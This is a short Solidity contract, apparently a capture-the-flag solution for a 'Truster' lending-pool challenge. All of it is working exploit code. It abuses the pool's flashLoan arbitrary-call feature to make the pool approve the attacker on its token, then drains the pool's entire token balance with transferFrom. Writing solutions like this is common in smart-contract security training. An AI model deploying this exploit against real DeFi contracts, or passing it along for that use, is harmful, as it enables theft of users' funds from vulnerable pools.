// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterHack  {

    function hack( address _pool, address _token, uint amount) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), amount
        );

        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
    }
}